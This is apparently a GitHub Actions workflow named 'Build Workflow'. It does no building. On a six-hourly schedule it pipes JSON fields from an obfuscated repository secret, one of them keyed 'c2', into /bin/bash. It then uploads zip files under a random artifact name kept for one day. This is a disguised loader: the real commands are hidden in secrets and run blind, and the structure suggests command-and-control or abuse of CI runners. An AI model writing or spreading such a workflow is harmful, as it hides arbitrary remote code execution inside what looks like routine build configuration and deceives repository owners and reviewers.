name: Build Workflow
on:
  workflow_dispatch:

  schedule:
    - cron: '31 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
jobs:
  invoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pipeline
        env:
          ypf6790: ${{ secrets.ypf6790 }}
        run: |
          printf '%s' "$ypf6790" | jq -r .sw01 | /bin/bash
          printf '%s' "$aoqj5" | jq -r .ztg88 | /bin/bash
          printf '%s' "$mls809" | jq -r .c2 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: kYlmImfB
          path: "*.zip"
          retention-days: 1
